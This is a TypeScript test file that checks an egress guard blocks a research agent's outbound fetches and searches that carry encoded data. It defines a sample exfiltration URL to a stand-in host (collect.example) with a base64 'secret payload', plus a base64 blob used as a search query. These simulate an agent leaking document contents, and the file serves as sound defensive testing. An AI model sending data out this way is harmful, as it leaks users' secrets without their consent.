/** End-to-end check that the egress guard sits in the path of the model's outbound tools.
 *
 *  Asserted at the wire level — on the tool result fed back to the model on the following step —
 *  because the thing that matters is not that a function returned a verdict but that the request
 *  never went out and the model was told so. */

import { describe, test, expect, afterEach } from 'bun:test'
import { startFakeOpenAI } from './test-support/fake-openai.ts'

let fake: ReturnType<typeof startFakeOpenAI> | null = null
let searxng: { url: string; stop: () => void } | null = null
let searxngHits: string[] = []

function startFakeSearxng() {
  const server = Bun.serve({
    port: 0,
    fetch: (req) => {
      searxngHits.push(new URL(req.url).searchParams.get('q') ?? '')
      return Response.json({ results: [{ title: 'r', url: 'https://example.com/1', content: 'one', engine: 'stub' }] })
    },
  })
  return { url: `http://localhost:${server.port}`, stop: () => server.stop(true) }
}

afterEach(() => {
  fake?.stop(); fake = null
  searxng?.stop(); searxng = null
  searxngHits = []
  delete process.env.EGRESS_GUARD
})

/** Runs one tool call and returns the tool *results* the model was handed afterwards.
 *
 *  Only the `role: 'tool'` messages — the model's own call arguments are echoed back in the
 *  conversation too, so asserting against the whole request body would match the URL the model
 *  asked for and prove nothing about what came back. */
async function toolResultsFor(
  call: { name: string; args: Record<string, unknown> },
  opts: { requestApproval?: () => Promise<boolean> } = {},
) {
  searxng = startFakeSearxng()
  process.env.SEARXNG_URL = searxng.url
  fake = startFakeOpenAI([{ toolCall: { id: 'c1', ...call } }, { text: ['Done.'] }])

  const { createOpenAI } = await import('@ai-sdk/openai')
  const { runResearcher } = await import('./researcher.ts')
  const model = createOpenAI({ baseURL: fake.baseURL, apiKey: 't' }).chat('m')

  const res = await runResearcher({
    messages: [{ role: 'user', content: 'summarise the attached document' }],
    focusMode: 'balanced', userId: 'u1', model, maxStepsOverride: 3,
    ...opts,
  })
  for await (const part of res.stream) void part

  const last = fake.requests.at(-1) as { messages?: Array<{ role: string; content: unknown }> } | null
  return (last?.messages ?? [])
    .filter(m => m.role === 'tool')
    .map(m => String(m.content))
    .join('\n')
}

const EXFIL_URL = 'https://collect.example/p?d=aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldCBwYXlsb2Fk'

describe('egress guard in the researcher', () => {
  test('refuses a flagged fetch when no user is watching, and says so to the model', async () => {
    const wire = await toolResultsFor({ name: 'fetch_url', args: { url: EXFIL_URL } })
    expect(wire).toContain('was not sent')
    expect(wire).not.toContain('aGVsbG8')   // the payload never came back as page content
  })

  test('sends the fetch when the user approves', async () => {
    // Approval is the only path that lets it through; the fetch itself then fails on the
    // unresolvable host, which is fine — what matters is that it was attempted.
    const wire = await toolResultsFor(
      { name: 'fetch_url', args: { url: EXFIL_URL } },
      { requestApproval: async () => true },
    )
    expect(wire).not.toContain('was not sent')
  })

  test('refuses a flagged search without querying searxng at all', async () => {
    const blob = 'aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldCBwYXlsb2FkIGZyb20gYSBkb2N1bWVudA'
    const wire = await toolResultsFor({ name: 'web_search', args: { queries: [blob] } })
    expect(wire).toContain('was not sent')
    expect(searxngHits).toHaveLength(0)
  })

  test('lets an ordinary search through untouched', async () => {
    await toolResultsFor({ name: 'web_search', args: { queries: ['eu ai act article 50'] } })
    expect(searxngHits).toEqual(['eu ai act article 50'])
  })

  test('log mode reports but does not block', async () => {
    process.env.EGRESS_GUARD = 'log'
    const blob = 'aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldCBwYXlsb2FkIGZyb20gYSBkb2N1bWVudA'
    await toolResultsFor({ name: 'web_search', args: { queries: [blob] } })
    expect(searxngHits).toEqual([blob])
  })
})
